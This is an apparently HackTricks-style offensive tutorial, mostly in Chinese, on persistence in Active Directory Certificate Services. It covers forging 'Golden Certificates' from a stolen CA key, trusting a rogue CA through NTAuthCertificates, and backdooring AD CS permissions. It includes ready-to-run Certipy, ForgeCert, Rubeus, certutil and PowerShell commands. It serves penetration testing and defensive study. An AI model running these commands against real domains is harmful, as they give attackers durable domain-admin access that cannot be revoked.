# AD CS 域持久性

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中共享的域持久性技术的总结**。查看该文档以了解更多细节。

## 使用被盗 CA 证书伪造证书 (Golden Certificate) - DPERSIST1

如何判断证书是 CA 证书？

如果满足以下几个条件，则可以判断该证书为 CA 证书：

- 该证书存储在 CA 服务器上，其私钥由机器的 DPAPI 保护，或在操作系统支持时由 TPM/HSM 等硬件保护。
- 证书的 Issuer 和 Subject 字段均与 CA 的区分名称相匹配。
- CA 证书中独有的 "CA Version" 扩展存在。
- 证书缺少 Extended Key Usage (EKU) 字段。

要提取该证书的私钥，CA 服务器上的 `certsrv.msc` 工具是通过内置 GUI 支持的方法。尽管如此，该证书与系统中存储的其他证书并无区别；因此，也可以使用诸如 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 之类的方法进行提取。

证书和私钥也可以使用 Certipy 获取，命令如下：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在获取 CA 证书及其私钥（`.pfx` 格式）后，可使用像 [ForgeCert](https://github.com/GhostPack/ForgeCert) 这样的工具来生成有效的证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 发起证书伪造的目标用户必须处于活动状态并能够在 Active Directory 中进行身份验证，流程才能成功。对像 krbtgt 这样的特殊帐户伪造证书是无效的。

该伪造证书将一直在指定的截止日期之前保持**有效**，并且只要根 CA 证书**有效**（通常为 5 到 **10+ 年**），该证书也将保持有效。它也对**机器**有效，因此结合 **S4U2Self**，攻击者可以**在 CA 证书有效期间在任何域内机器上维持持久性**。\
此外，用该方法生成的**证书****无法被撤销**，因为 CA 并不了解它们。

### 在 Strong Certificate Mapping Enforcement（2025+）下的操作

自 2025 年 2 月 11 日（在 KB5014754 推出之后），域控制器对证书映射默认启用 **Full Enforcement**。 实际上，这意味着你的伪造证书必须要么：

- 包含与目标帐户的强绑定（例如，SID security extension），或
- 与目标对象的 `altSecurityIdentities` 属性上的强显式映射配对。

一种可靠的持久化方法是铸造一个与被盗 Enterprise CA 链接的伪造证书，然后向受害主体添加强显式映射：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意事项
- 如果你能制作包含 SID security extension 的伪造证书，这些在 Full Enforcement 下也会隐式映射。否则，优先使用显式的强映射。详见 [account-persistence](account-persistence.md) 以获取关于显式映射的更多信息。
- 撤销 (revocation) 对防守方在此无效：伪造证书在 CA 数据库中不存在，因此无法撤销。

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
当与前面提到的使用 ForgeCert 动态生成证书的方法结合时，此能力尤其相关。

> 2025 年后映射考虑：将一个恶意 CA 放入 NTAuth 只是在颁发 CA 上建立信任。要在 DC 处于 **Full Enforcement** 时使用叶证书进行登录，叶证书必须包含 SID 安全扩展，或在目标对象上存在强显式映射（例如在 `altSecurityIdentities` 中使用 Issuer+Serial）。参见 {{#ref}}account-persistence.md{{#endref}}。

## 恶意错误配置 - DPERSIST3

通过修改 AD CS 组件的安全描述符实现持久化的机会很多。"[Domain Escalation](domain-escalation.md)" 一节中描述的修改，具有提升权限的攻击者可以恶意实施。这包括向敏感组件添加“控制权限”（例如 WriteOwner/WriteDACL/etc.），例如：

- **CA 服务器的 AD 计算机** 对象
- **CA 服务器的 RPC/DCOM 服务**
- 位于 **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 中的任何 **后代 AD 对象或容器**（例如 Certificate Templates 容器、Certification Authorities 容器、NTAuthCertificates 对象等）
- 默认或由组织委派有权控制 AD CS 的 **AD 组**（例如内建的 Cert Publishers 组及其任何成员）

一个恶意实施的例子是，域中拥有 **elevated permissions** 的攻击者向默认的 **`User`** 证书模板添加 **`WriteOwner`** 权限，并将攻击者作为该权限的主体。为利用此项，攻击者首先会将 **`User`** 模板的所有权更改为自己。随后，在模板上将 **`mspki-certificate-name-flag`** 设置为 **1**，以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，允许用户在请求中提供 Subject Alternative Name。之后，攻击者可以使用该模板 enroll（申请证书），在替代名称中选择一个域管理员名称，并使用获取的证书以域管理员（DA）身份进行认证。

攻击者为了长期域持久化可能设置的实际控制项（详见 {{#ref}}domain-escalation.md{{#endref}} 的完整细节和检测）：

- 允许请求者提供 SAN 的 CA 策略标志（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这会使类似 ESC1 的路径仍可被利用。
- 允许签发可用于认证的模板 DACL 或设置（例如添加 Client Authentication EKU，启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` 对象或 CA 容器，以便在防御者尝试清理时持续重新引入恶意颁发者。

> [!TIP]
> 在应用 KB5014754 之后的加固环境中，将这些错误配置与显式强映射（`altSecurityIdentities`）配合使用，可确保即便 DC 强制执行强映射，你签发或伪造的证书仍可被使用。



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
